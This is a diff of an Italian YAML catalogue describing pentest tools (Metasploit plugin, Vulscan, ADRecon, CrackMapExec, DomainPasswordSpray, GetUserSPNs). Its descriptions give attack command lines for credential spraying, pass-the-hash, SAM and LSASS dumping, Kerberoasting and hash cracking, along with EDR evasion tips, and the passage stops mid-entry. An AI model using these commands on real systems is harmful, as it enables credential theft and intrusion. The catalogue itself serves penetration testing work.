@@ -2,1066 +2,321 @@
   name: "Pentest-plugin"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "metasploit"
-  phases: ["00_Common"]
-  caps: ["automation", "workspace", "import-export", "loot-triage"]
+  installation: "GitHub"
   repo: "https://github.com/darkoperator/Metasploit-Plugins"
-  desc: "Plugin Metasploit per automazione discovery, auto-exploitation da report
-    scanner, post-exploitation multi-sessione e gestione progetti con logging strutturato"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Il plugin <strong>Pentest</strong>
-    di darkoperator estende Metasploit Framework con capacità di automazione operativa
-    pensate per ridurre le operazioni ripetitive durante engagement complessi. Integra
-    comandi per discovery di rete, correlazione automatica di vulnerabilità da report
-    esterni e orchestrazione di moduli post-exploitation su sessioni multiple.</p><br><hr><h4
-    class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-exploitation:</strong>
-    Il comando <code>auto_exploit</code> importa risultati da scanner di vulnerabilità
-    (Nessus, Qualys, OpenVAS) e lancia automaticamente moduli Metasploit correlati.
-    Supporta anche l'identificazione di vettori client-side tramite <code>show_client_side</code>
-    e <code>vuln_exploit</code> per exploitation mirata.</p><p><strong>Discovery:</strong>
-    Include <code>network_discover</code> per enumerazione attiva, <code>discover_db</code>
-    per interrogare il database workspace e funzioni di pivot discovery via sessioni
-    Meterpreter per esplorare segmenti interni.</p><p><strong>Post-automation:</strong>
-    I comandi <code>multi_cmd</code>, <code>multi_meter_cmd</code> e <code>multi_post</code>
-    consentono di eseguire comandi o moduli post su multiple sessioni contemporaneamente.
-    <code>app_creds</code> e <code>sys_creds</code> estraggono credenziali applicative
-    e di sistema in batch.</p><p><strong>Project management:</strong> Crea e gestisce
-    progetti basati su workspace con export completo dei dati, logging cronologico
-    di tutte le azioni e supporto per archiviazione/import in altri tool.</p><br><hr><h4 class=\"\
-    rt-green\">Utilizzo</h4><p>Caricare il plugin: <code>msf> load pentest</code><br>Verificare
-    opzioni: <code>msf> auto_exploit -h</code><br>Gestire progetti: <code>msf> project
-    -h</code></p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li>Triage rapido da report
-    di vulnerability scanner con exploitation automatica mirata</li><li>Coordinamento
-    di azioni post-exploitation su decine di sessioni attive</li><li>Standardizzazione
-    della raccolta di evidenze e artefatti per reporting</li></ul><br><hr><h4 class=\"rt-red\"\
-    >Considerazioni OPSEC</h4><ul><li>Limitare lo scope dell'auto-exploitation a host/servizi
-    autorizzati</li><li>Operare durante finestre di change concordate per ridurre
-    impatto</li><li>Utilizzare workspace separati per ciascun progetto ed esportare
-    archivi firmati</li></ul>"
+  desc: "Plugin Metasploit per automazione discovery, auto-exploitation da report scanner, post-exploitation multi-sessione e gestione progetti con logging strutturato"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Il plugin <strong>Pentest</strong> di darkoperator estende Metasploit Framework con capacità di automazione operativa pensate per ridurre le operazioni ripetitive durante engagement complessi. Integra comandi per discovery di rete, correlazione automatica di vulnerabilità da report esterni e orchestrazione di moduli post-exploitation su sessioni multiple.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-exploitation:</strong> Il comando <code>auto_exploit</code> importa risultati da scanner di vulnerabilità (Nessus, Qualys, OpenVAS) e lancia automaticamente moduli Metasploit correlati. Supporta anche l'identificazione di vettori client-side tramite <code>show_client_side</code> e <code>vuln_exploit</code> per exploitation mirata.</p><p><strong>Discovery:</strong> Include <code>network_discover</code> per enumerazione attiva, <code>discover_db</code> per interrogare il database workspace e funzioni di pivot discovery via sessioni Meterpreter per esplorare segmenti interni.</p><p><strong>Post-automation:</strong> I comandi <code>multi_cmd</code>, <code>multi_meter_cmd</code> e <code>multi_post</code> consentono di eseguire comandi o moduli post su multiple sessioni contemporaneamente. <code>app_creds</code> e <code>sys_creds</code> estraggono credenziali applicative e di sistema in batch.</p><p><strong>Project management:</strong> Crea e gestisce progetti basati su workspace con export completo dei dati, logging cronologico di tutte le azioni e supporto per archiviazione/import in altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il plugin: <code>msf> load pentest</code><br>Verificare opzioni: <code>msf> auto_exploit -h</code><br>Gestire progetti: <code>msf> project -h</code></p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li>Triage rapido da report di vulnerability scanner con exploitation automatica mirata</li><li>Coordinamento di azioni post-exploitation su decine di sessioni attive</li><li>Standardizzazione della raccolta di evidenze e artefatti per reporting</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li>Limitare lo scope dell'auto-exploitation a host/servizi autorizzati</li><li>Operare durante finestre di change concordate per ridurre impatto</li><li>Utilizzare workspace separati per ciascun progetto ed esportare archivi firmati</li></ul>"
   best_in: false
-  category_path: ["00_Common", "Metasploit_Plugins"]
+  category_path: [ "00_Common", "Metasploit_Plugins" ]
   notes:
 
 - id: "scipag-vulscan"
   name: "Vulscan"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "nmap"
-  phases: ["00_Common"]
-  caps: ["service-detection", "vuln-mapping", "cve-correlation"]
+  installation: "GitHub"
   repo: "https://github.com/scipag/vulscan"
-  desc: "Modulo NSE per Nmap che converte output di version detection in suggerimenti
-    CVE tramite database offline di vulnerabilità"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Vulscan</strong> è uno
-    script NSE (Nmap Scripting Engine) sviluppato da SCIP AG che trasforma Nmap in
-    uno strumento di vulnerability mapping passivo. Correlando i risultati della version
-    detection (<code>-sV</code>) con database offline di vulnerabilità, identifica
-    potenziali CVE e exploit applicabili ai servizi rilevati.</p><br><hr><h4 class=\"rt-purple\"\
-    >Funzionamento</h4><p>Lo script confronta prodotto e versione di ciascun servizio
-    con molteplici database locali:</p><ul><li><strong>scipvuldb.csv</strong> - Database
-    VulDB</li><li><strong>cve.csv</strong> - MITRE CVE</li><li><strong>exploitdb.csv</strong>
-    - Exploit Database</li><li><strong>osvdb.csv</strong> - Open Source Vulnerability
-    Database</li><li><strong>securityfocus.csv</strong> - SecurityFocus BID</li><li><strong>securitytracker.csv</strong>
-    - SecurityTracker</li></ul><p>Il matching avviene completamente offline, senza
-    richieste esterne, rendendolo ideale per ambienti air-gapped o con connettività
-    limitata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Scansione base:</strong></p><pre><code>nmap
-    -sV --script=vulscan/vulscan.nse target.com</code></pre><p><strong>Database specifico:</strong></p><pre><code>nmap
-    -sV --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv target.com</code></pre><p><strong>Aggiornamento
-    database:</strong><br>Eseguire lo script <code>update.sh</code> nella directory
-    vulscan per scaricare gli ultimi CSV.</p><br><hr><h4 class=\"rt-amber\">Best practice</h4><ul><li>Utilizzare
-    come triage rapido prima di vulnerability scanner più pesanti (Nessus, OpenVAS)</li><li>Aggiornare
-    regolarmente i database CSV per risultati affidabili</li><li>Filtrare i risultati
-    per prioritizzare servizi esposti su Internet</li><li>Integrare in pipeline di
-    discovery automatizzata per ridurre tempi di recon</li></ul><br><hr><h4 class=\"rt-red\"\
-    >Limitazioni</h4><p>I risultati sono suggerimenti basati su pattern nome/versione
-    e richiedono validazione manuale. False positive possono verificarsi con backport
-    di patch o versioni custom. Non sostituisce scanner di vulnerabilità completi
-    ma accelera la fase di prioritizzazione.</p><br><hr>"
+  desc: "Modulo NSE per Nmap che converte output di version detection in suggerimenti CVE tramite database offline di vulnerabilità"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Vulscan</strong> è uno script NSE (Nmap Scripting Engine) sviluppato da SCIP AG che trasforma Nmap in uno strumento di vulnerability mapping passivo. Correlando i risultati della version detection (<code>-sV</code>) con database offline di vulnerabilità, identifica potenziali CVE e exploit applicabili ai servizi rilevati.</p><br><hr><h4 class=\"rt-purple\">Funzionamento</h4><p>Lo script confronta prodotto e versione di ciascun servizio con molteplici database locali:</p><ul><li><strong>scipvuldb.csv</strong> - Database VulDB</li><li><strong>cve.csv</strong> - MITRE CVE</li><li><strong>exploitdb.csv</strong> - Exploit Database</li><li><strong>osvdb.csv</strong> - Open Source Vulnerability Database</li><li><strong>securityfocus.csv</strong> - SecurityFocus BID</li><li><strong>securitytracker.csv</strong> - SecurityTracker</li></ul><p>Il matching avviene completamente offline, senza richieste esterne, rendendolo ideale per ambienti air-gapped o con connettività limitata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Scansione base:</strong></p><pre><code>nmap -sV --script=vulscan/vulscan.nse target.com</code></pre><p><strong>Database specifico:</strong></p><pre><code>nmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv target.com</code></pre><p><strong>Aggiornamento database:</strong><br>Eseguire lo script <code>update.sh</code> nella directory vulscan per scaricare gli ultimi CSV.</p><br><hr><h4 class=\"rt-amber\">Best practice</h4><ul><li>Utilizzare come triage rapido prima di vulnerability scanner più pesanti (Nessus, OpenVAS)</li><li>Aggiornare regolarmente i database CSV per risultati affidabili</li><li>Filtrare i risultati per prioritizzare servizi esposti su Internet</li><li>Integrare in pipeline di discovery automatizzata per ridurre tempi di recon</li></ul><br><hr><h4 class=\"rt-red\">Limitazioni</h4><p>I risultati sono suggerimenti basati su pattern nome/versione e richiedono validazione manuale. False positive possono verificarsi con backport di patch o versioni custom. Non sostituisce scanner di vulnerabilità completi ma accelera la fase di prioritizzazione.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Scripts"]
+  category_path: [ "00_Common", "Scripts" ]
   notes:
 
 - id: "adrecon"
   name: "ADRecon"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["ad-inventory", "reporting", "risk-overview"]
+  installation: "GitHub"
   repo: "https://github.com/sense-of-security/ADRecon"
-  desc: "Tool PowerShell per raccolta completa di artefatti Active Directory (trust,
-    GPO, deleghe, utenti privilegiati) con report Excel strutturati"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ADRecon</strong> è uno
-    strumento di enumerazione Active Directory che genera report dettagliati dell'infrastruttura
-    Windows enterprise. Raccoglie informazioni da forest, domain, domain controller,
-    configurazioni di sicurezza, utenti, gruppi, GPO, DNS e computer, producendo un
-    workbook Excel con metriche aggregate e viste riassuntive.</p><br><hr><h4 class=\"rt-purple\"\
-    >Capacità di raccolta</h4><p>Il tool interroga Active Directory via LDAP e RSAT
-    (dove disponibili) per estrarre:</p><ul><li><strong>Forest/Domain:</strong> Trust,
-    livelli funzionali, configurazioni globali</li><li><strong>Domain Controllers:</strong>
-    Ruoli FSMO, configurazioni SMB signing</li><li><strong>Utenti/Gruppi:</strong>
-    Account privilegiati, membership, SPN</li><li><strong>OU e GPO:</strong> Struttura
-    organizzativa, Group Policy Object e gPLink</li><li><strong>Deleghe:</strong>
-    Deleghe Kerberos constrained/unconstrained</li><li><strong>DNS:</strong> Zone
-    e record</li><li><strong>Computer:</strong> Inventario host joinati al dominio</li></ul></p><br><hr><h4
-    class=\"rt-green\">Modalità di esecuzione</h4><p>ADRecon può operare in diversi
-    scenari:</p><ul><li><strong>Da host domain-joined</strong> con credenziali correnti</li><li><strong>Da
-    host non joinato</strong> specificando credenziali di dominio</li><li><strong>Con
-    utenza low-privilege</strong> per baseline non invasiva</li></ul></p><p><strong>Esempio
-    base:</strong></p><pre><code>PS> .\\ADRecon.ps1</code></pre><p><strong>Con credenziali
-    specifiche:</strong></p><pre><code>PS> .\\ADRecon.ps1 -DomainController DC01.acme.local
-    -Credential (Get-Credential)</code></pre><br><hr><h4 class=\"rt-amber\">Utilizzo in pentest</h4><ul><li><strong>Pre-exploitation:</strong>
-    Baseline iniziale per mappare superfici d'attacco e identificare misconfigurazioni</li><li><strong>Post-exploitation:</strong>
-    Due-diligence approfondita per attack path e privilege escalation</li><li>L'output
-    strutturato facilita identificazione di trust deboli, deleghe rischiose e GPO
-    mal configurate</li></ul><br><hr><h4 class=\"rt-red\">Note operative</h4><p>Il tool genera
-    traffico LDAP significativo visibile nei log dei Domain Controller. Pianificare
-    l'esecuzione in finestre concordate e considerare throttling su domini di grandi
-    dimensioni. I report Excel possono contenere informazioni sensibili: proteggere
-    adeguatamente e limitare la diffusione.</p><br><hr>"
+  desc: "Tool PowerShell per raccolta completa di artefatti Active Directory (trust, GPO, deleghe, utenti privilegiati) con report Excel strutturati"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ADRecon</strong> è uno strumento di enumerazione Active Directory che genera report dettagliati dell'infrastruttura Windows enterprise. Raccoglie informazioni da forest, domain, domain controller, configurazioni di sicurezza, utenti, gruppi, GPO, DNS e computer, producendo un workbook Excel con metriche aggregate e viste riassuntive.</p><br><hr><h4 class=\"rt-purple\">Capacità di raccolta</h4><p>Il tool interroga Active Directory via LDAP e RSAT (dove disponibili) per estrarre:</p><ul><li><strong>Forest/Domain:</strong> Trust, livelli funzionali, configurazioni globali</li><li><strong>Domain Controllers:</strong> Ruoli FSMO, configurazioni SMB signing</li><li><strong>Utenti/Gruppi:</strong> Account privilegiati, membership, SPN</li><li><strong>OU e GPO:</strong> Struttura organizzativa, Group Policy Object e gPLink</li><li><strong>Deleghe:</strong> Deleghe Kerberos constrained/unconstrained</li><li><strong>DNS:</strong> Zone e record</li><li><strong>Computer:</strong> Inventario host joinati al dominio</li></ul><br><hr><h4 class=\"rt-green\">Modalità di esecuzione</h4><p>ADRecon può operare in diversi scenari:</p><ul><li><strong>Da host domain-joined</strong> con credenziali correnti</li><li><strong>Da host non joinato</strong> specificando credenziali di dominio</li><li><strong>Con utenza low-privilege</strong> per baseline non invasiva</li></ul><p><strong>Esempio base:</strong></p><pre><code>PS> .\\ADRecon.ps1</code></pre><p><strong>Con credenziali specifiche:</strong></p><pre><code>PS> .\\ADRecon.ps1 -DomainController DC01.acme.local -Credential (Get-Credential)</code></pre><br><hr><h4 class=\"rt-amber\">Utilizzo in pentest</h4><ul><li><strong>Pre-exploitation:</strong> Baseline iniziale per mappare superfici d'attacco e identificare misconfigurazioni</li><li><strong>Post-exploitation:</strong> Due-diligence approfondita per attack path e privilege escalation</li><li>L'output strutturato facilita identificazione di trust deboli, deleghe rischiose e GPO mal configurate</li></ul><br><hr><h4 class=\"rt-red\">Note operative</h4><p>Il tool genera traffico LDAP significativo visibile nei log dei Domain Controller. Pianificare l'esecuzione in finestre concordate e considerare throttling su domini di grandi dimensioni. I report Excel possono contenere informazioni sensibili: proteggere adeguatamente e limitare la diffusione.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "crackmapexec-win"
   name: "CrackMapExecWin"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["auth-spray", "lateral-movement", "remote-exec", "loot"]
+  installation: "GitHub"
   repo: "https://github.com/maaaaz/CrackMapExecWin"
-  desc: "Post-exploitation framework multi-protocol (SMB/WinRM/SSH/LDAP/MSSQL) per
-    network sweeping, credential spraying, command execution e module-based attacks"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (CME) è Swiss Army
-    knife per post-exploitation Windows networks, combinando credential validation,
-    enumeration, lateral movement e exploitation in unified interface. Supporta multiple
-    protocols, module system extensible e database backend per tracking pwned hosts.
-    Usato per rapid network assessment post-compromise, credential validation at scale
-    e automated exploitation.</p><br><hr><h4 class=\"rt-purple\">Core capabilities multi-protocol</h4><p><strong>SMB
-    protocol (primary):</strong> Credential validation, command execution (psexec/wmiexec/smbexec/atexec),
-    file operations, share enumeration, SAM/LSA/NTDS dumping, session enumeration.</p><p><strong>WinRM
-    protocol:</strong> PowerShell remoting-based execution, credential validation,
-    command execution via PS remoting, ideal per environments con PSRemoting enabled
-    ma SMB restricted.</p><p><strong>LDAP protocol:</strong> AD enumeration senza
-    host interaction, user/group/computer queries, bloodhound data collection, password
-    policy retrieval.</p><p><strong>MSSQL protocol:</strong> SQL server credential
-    validation, xp_cmdshell command execution, linked server enumeration, SQL injection-style
-    attacks.</p><p><strong>SSH/FTP protocols:</strong> Linux target support per hybrid
-    environments.</p><br><hr><h4 class=\"rt-green\">Utilizzo operativo esempi</h4><p><strong>Credential
-    spraying network-wide:</strong><br><code>crackmapexec smb 192.168.1.0/24 -u administrator
-    -p Password123</code><br>Test single credential across entire subnet, identify
-    reused local admin passwords.</p><p><strong>Pass-the-hash validation:</strong><br><code>crackmapexec
-    smb targets.txt -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c</code><br>Validate
-    NTLM hash across multiple hosts from file.</p><p><strong>Command execution sweep:</strong><br><code>crackmapexec
-    smb 192.168.1.0/24 -u admin -p pass -x 'whoami'</code><br>Execute command su all
-    accessible hosts in subnet.</p><p><strong>SAM dumping multi-host:</strong><br><code>crackmapexec
-    smb targets.txt -u admin -p pass --sam</code><br>Extract local account hashes
-    da multiple machines.</p><p><strong>Module execution (e.g., mimikatz):</strong><br><code>crackmapexec
-    smb 192.168.1.50 -u admin -p pass -M mimikatz</code><br>Run mimikatz module per
-    credential extraction.</p><br><hr><h4 class=\"rt-amber\">Module system e automation</h4><p><strong>Built-in
-    modules:</strong> mimikatz (credential dumping), enum_avproducts (AV detection),
-    enum_dns (DNS records), lsassy (LSASS dumping), nanodump (indirect LSASS dumping),
-    ntdsutil (NTDS extraction), rdp (enable RDP), uac (UAC status check), spider_plus
-    (file searching).</p><p><strong>Module chaining workflow:</strong> Enumerate accessible
-    hosts → validate credentials → execute enumeration modules → identify high-value
-    targets → execute exploitation modules → extract credentials → repeat with new
-    credentials (credential cascade).</p><p><strong>Database tracking:</strong> CME
-    maintains SQLite database tracking hosts, credentials, pwned status. Query database:
-    <code>cmedb</code> interactive shell per review historical access.</p><p><strong>Custom
-    module development:</strong> Python-based module system allows custom attack logic,
-    integrate organization-specific checks o exploitation techniques.</p><br><hr><h4 class=\"\
-    rt-red\">OPSEC considerations e detection</h4><p>CME è inherently noisy: network
-    sweeping genera connection attempts a multiple hosts, triggering EDR alerts, failed
-    authentication logs (4625), successful authentications (4624) su many hosts simultaneously.
-    Detection signatures: burst SMB connections from single source IP, authentication
-    attempts across multiple hosts within short timeframe, characteristic User-Agent
-    strings in HTTP-based modules. Evasion strategies: throttle scan speed (--jitter,
-    --delay flags), limit concurrent threads, target specific hosts invece broad sweeps,
-    use stealthier execution methods (atexec vs psexec). Credential validation generates
-    logs: ogni SMB connection attempt logged even se authentication fails, produces
-    audit trail su target systems. Operational phasing: initial narrow reconnaissance
-    targeting known-accessible hosts, expand scope gradually based on success. Module
-    selection impact OPSEC: LSASS dumping (lsassy, nanodump) triggers AV/EDR alerts,
-    file searching (spider_plus) generates filesystem access logs, mimikatz module
-    highest detection risk. Alternative approaches: use built-in Windows tools via
-    command execution invece modules quando stealth paramount. Protocol choice matters:
-    WinRM execution can be stealthier than SMB in environments monitoring SMB aggressively,
-    LDAP enumeration doesn't touch endpoints directly (lower detection probability).
-    CME logging verbose: output contiene passwords in cleartext, secure handling mandatory.
-    Credential reuse detection: CME identifies credential reuse patterns across network,
-    valuable intelligence ma also indicates poor credential hygiene requiring remediation
-    recommendations. Post-engagement cleanup: CME doesn't create persistent artifacts
-    oltre authentication logs, but review executed commands per identify potential
-    leftover files/changes. Network segmentation assessment: CME rapid feedback su
-    which subnets accessible with current credentials, informs network trust boundaries.
-    CME actively developed: updates frequent con new modules e protocol support, stay
-    current for latest capabilities. Alternative tools: NetExec (fork) provides similar
-    functionality con some enhancements, consider based on specific feature needs.</p><br><hr>"
+  desc: "Post-exploitation framework multi-protocol (SMB/WinRM/SSH/LDAP/MSSQL) per network sweeping, credential spraying, command execution e module-based attacks"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (CME) è uno Swiss Army knife per post-exploitation di reti Windows, combinando validazione credenziali, enumerazione, lateral movement ed exploitation in un'interfaccia unificata. Supporta protocolli multipli, sistema di moduli estensibile e database backend per tracciare host compromessi.</p><br><hr><h4 class=\"rt-purple\">Capacità core multi-protocollo</h4><p><strong>Protocollo SMB (primario):</strong> Validazione credenziali, esecuzione comandi (psexec/wmiexec/smbexec/atexec), operazioni su file, enumerazione share, dumping SAM/LSA/NTDS, enumerazione sessioni.</p><p><strong>Protocollo WinRM:</strong> Esecuzione basata su PowerShell remoting, validazione credenziali, ideale per ambienti con PSRemoting abilitato ma SMB ristretto.</p><p><strong>Protocollo LDAP:</strong> Enumerazione AD senza interazione con host, query utenti/gruppi/computer, raccolta dati BloodHound, recupero password policy.</p><p><strong>Protocollo MSSQL:</strong> Validazione credenziali SQL server, esecuzione comandi xp_cmdshell, enumerazione linked server.</p><p><strong>Protocolli SSH/FTP:</strong> Supporto target Linux per ambienti ibridi.</p><br><hr><h4 class=\"rt-green\">Esempi di utilizzo operativo</h4><p><strong>Credential spraying network-wide:</strong><br><code>crackmapexec smb 192.168.1.0/24 -u administrator -p Password123</code></p><p><strong>Validazione pass-the-hash:</strong><br><code>crackmapexec smb targets.txt -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c</code></p><p><strong>Command execution sweep:</strong><br><code>crackmapexec smb 192.168.1.0/24 -u admin -p pass -x 'whoami'</code></p><p><strong>Dumping SAM multi-host:</strong><br><code>crackmapexec smb targets.txt -u admin -p pass --sam</code></p><p><strong>Esecuzione modulo (es. mimikatz):</strong><br><code>crackmapexec smb 192.168.1.50 -u admin -p pass -M mimikatz</code></p><br><hr><h4 class=\"rt-amber\">Sistema moduli e automazione</h4><p><strong>Moduli built-in:</strong> mimikatz (credential dumping), enum_avproducts (rilevamento AV), enum_dns (record DNS), lsassy (dumping LSASS), nanodump (dumping LSASS indiretto), ntdsutil (estrazione NTDS), rdp (abilitazione RDP), uac (verifica stato UAC), spider_plus (ricerca file).</p><p><strong>Tracciamento database:</strong> CME mantiene database SQLite che traccia host, credenziali, stato pwned. Query database: <code>cmedb</code> shell interattiva.</p><p><strong>Sviluppo moduli custom:</strong> Sistema moduli basato Python permette logica d'attacco personalizzata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC e rilevamento</h4><p>CME è intrinsecamente rumoroso: network sweeping genera tentativi di connessione a host multipli, triggera alert EDR, log autenticazione fallita (4625) e riuscite (4624) su molti host simultaneamente. Strategie evasion: throttle velocità scan (flag --jitter, --delay), limita thread concorrenti, target host specifici. Logging CME verbose: output contiene password in cleartext, handling sicuro obbligatorio.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "domainpasswordspray"
   name: "DomainPasswordSpray.ps1"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["password-spraying", "user-enum", "opsec"]
+  installation: "GitHub"
   repo: "https://github.com/dafthack/DomainPasswordSpray"
-  desc: "Script PowerShell per password spraying contro domini Active Directory con
-    generazione automatica userlist e rispetto delle lockout policy"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DomainPasswordSpray.ps1</strong>
-    è uno script PowerShell specializzato per password spraying su Active Directory
-    che enfatizza la sicurezza operativa e il rispetto delle policy aziendali. Genera
-    automaticamente liste di utenti dal dominio e implementa controlli per evitare
-    account lockout.</p><br><hr><h4 class=\"rt-purple\">Funzionalità chiave</h4><p><strong>Generazione
-    automatica userlist:</strong> Interroga Active Directory per estrarre account
-    validi, con filtri per escludere:</p><ul><li>Account disabilitati</li><li>Account
-    già lockati</li><li>Account con badPwdCount vicino alla soglia di lockout</li></ul></p><p><strong>Rispetto
-    lockout policy:</strong> Verifica la Fine Grained Password Policy del dominio
-    e adatta il comportamento per evitare di triggerare blocchi account.</p><p><strong>Modalità
-    di autenticazione:</strong> Supporta LDAP e Kerberos pre-authentication per la
-    validazione credenziali, con opzioni per targeting specifico di Domain Controller.</p><br><hr><h4
-    class=\"rt-green\">Esempi di utilizzo</h4><p><strong>Password singola con userlist
-    automatica:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Password Spring2025</code></pre><p><strong>Con
-    userlist custom:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -UserList
-    users.txt -Password Welcome1!</code></pre><p><strong>Multiple password su dominio
-    specifico:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Domain acme.local
-    -PasswordList passwords.txt -OutFile results.txt</code></pre><p><strong>Quiet
-    mode per automation:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Password
-    Winter2025 -Quiet -OutFile valid-creds.txt</code></pre><br><hr><h4 class=\"rt-amber\"\
-    >Best practice</h4><ul><li>Testare sempre con 1-2 password prima di campagne estese</li><li>Rispettare
-    intervalli tra tentativi (minimo 30 minuti tra round)</li><li>Usare password stagionali/comuni
-    specifiche per il contesto aziendale</li><li>Limitare scope a OU/gruppi specifici
-    quando possibile</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni di sicurezza</h4><p>Anche
-    con protezioni integrate, il password spraying genera eventi 4771 (Kerberos pre-auth
-    failed) o 4625 (logon failed) sui Domain Controller. SOC maturi possono rilevare
-    pattern anomali. Operare in finestre autorizzate, con scope chiaro e documentazione
-    delle attività. L'output contiene credenziali valide: proteggere i file di risultato
-    appropriatamente.</p><br><hr>"
+  desc: "Script PowerShell per password spraying contro domini Active Directory con generazione automatica userlist e rispetto delle lockout policy"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DomainPasswordSpray.ps1</strong> è uno script PowerShell specializzato per password spraying su Active Directory che enfatizza la sicurezza operativa e il rispetto delle policy aziendali. Genera automaticamente liste di utenti dal dominio e implementa controlli per evitare account lockout.</p><br><hr><h4 class=\"rt-purple\">Funzionalità chiave</h4><p><strong>Generazione automatica userlist:</strong> Interroga Active Directory per estrarre account validi, con filtri per escludere account disabilitati, già lockati, o con badPwdCount vicino alla soglia di lockout.</p><p><strong>Rispetto lockout policy:</strong> Verifica la Fine Grained Password Policy del dominio e adatta il comportamento per evitare di triggerare blocchi account.</p><p><strong>Modalità di autenticazione:</strong> Supporta LDAP e Kerberos pre-authentication per la validazione credenziali.</p><br><hr><h4 class=\"rt-green\">Esempi di utilizzo</h4><p><strong>Password singola con userlist automatica:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Password Spring2025</code></pre><p><strong>Con userlist custom:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1!</code></pre><p><strong>Multiple password su dominio specifico:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Domain acme.local -PasswordList passwords.txt -OutFile results.txt</code></pre><p><strong>Quiet mode per automation:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Password Winter2025 -Quiet -OutFile valid-creds.txt</code></pre><br><hr><h4 class=\"rt-amber\">Best practice</h4><ul><li>Testare sempre con 1-2 password prima di campagne estese</li><li>Rispettare intervalli tra tentativi (minimo 30 minuti tra round)</li><li>Usare password stagionali/comuni specifiche per il contesto aziendale</li><li>Limitare scope a OU/gruppi specifici quando possibile</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni di sicurezza</h4><p>Anche con protezioni integrate, il password spraying genera eventi 4771 (Kerberos pre-auth failed) o 4625 (logon failed) sui Domain Controller. SOC maturi possono rilevare pattern anomali. L'output contiene credenziali valide: proteggere i file di risultato appropriatamente.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "getuserspns-windows"
   name: "GetUserSPNs_windows.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["kerberoasting", "spn-enum"]
+  installation: "GitHub"
   repo: "https://github.com/maaaaz/impacket-examples-windows"
-  desc: "Esegue enum SPN utente e richiede TGS per kerberoasting, consentendo cracking
-    offline di password di service account su domini AD"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GetUserSPNs_windows.exe</strong>
-    è la compilazione Windows del tool Impacket per Kerberoasting. Enumera Service
-    Principal Name (SPN) associati ad account utente e richiede TGS (Ticket Granting
-    Service) che possono essere crackati offline per recuperare password di service
-    account.</p><br><hr><h4 class=\"rt-purple\">Tecnica di attacco</h4><p>Il Kerberoasting
-    sfrutta una caratteristica del protocollo Kerberos: qualsiasi utente di dominio
-    autenticato può richiedere TGS per servizi che hanno SPN registrati. Questi ticket
-    sono cifrati con l'hash della password del service account e possono essere estratti
-    e crackati offline senza generare failed logon events.</p><br><hr><h4 class=\"rt-green\"\
-    >Utilizzo</h4><p><strong>Enumerazione SPN base:</strong></p><pre><code>GetUserSPNs.exe
-    -dc-ip 192.168.1.10 acme.local/user:password</code></pre><p><strong>Request TGS
-    con export:</strong></p><pre><code>GetUserSPNs.exe -request -dc-ip 192.168.1.10
-    -outputfile tgs.txt acme.local/user:password</code></pre><p><strong>Con hash NTLM:</strong></p><pre><code>GetUserSPNs.exe
-    -hashes :aad3b435b51404ee... -dc-ip 192.168.1.10 -request acme.local/user</code></pre><p><strong>Targeting
-    specifico:</strong></p><pre><code>GetUserSPNs.exe -request -dc-ip 192.168.1.10
-    acme.local/user:pass -target-user svc-sql</code></pre><br><hr><h4 class=\"rt-amber\">Pipeline
-    completa</h4><ol><li>Eseguire enum SPN con GetUserSPNs</li><li>Richiedere TGS
-    per account interessanti (evitare krbtgt e account computer)</li><li>Estrarre
-    ticket in formato Hashcat/John (<code>-format hashcat/john</code>)</li><li>Crack
-    offline: <code>hashcat -m 13100 tgs.txt wordlist.txt</code></li><li>Validare credenziali
